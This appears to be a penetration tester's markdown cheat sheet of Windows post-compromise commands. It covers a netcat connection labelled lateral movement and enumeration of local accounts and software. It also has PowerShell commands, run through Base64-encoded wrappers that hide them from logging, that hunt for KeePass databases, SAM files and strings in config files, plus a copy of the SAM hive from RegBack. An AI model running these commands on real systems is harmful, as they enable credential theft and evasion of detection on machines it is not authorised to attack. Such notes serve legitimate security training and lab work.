## Lateral Movement:

- `nc 192.168.50.220 4444`

## Local Account Enumeration:

- `whoami`
- `whoami /groups`
- `Get-LocalUser`
- `Get-LocalUser -Name "username" | Select-Object \*`
- `Get-LocalGroup`
- `Get-LocalGroupMember Administrators`

## Get Installed Applications:

### 32 Bit:

- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

### 64 Bit:

- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

## Local System Enumeration

- `$command = "Get-Process"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include SAM -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include _.txt,_.ini -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'YourSearchString'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination "C:\Path\To\NewLocation\SAM"`
- `systeminfo`
- `ipconfig /all`
- `route print`
- `netstat -ano`
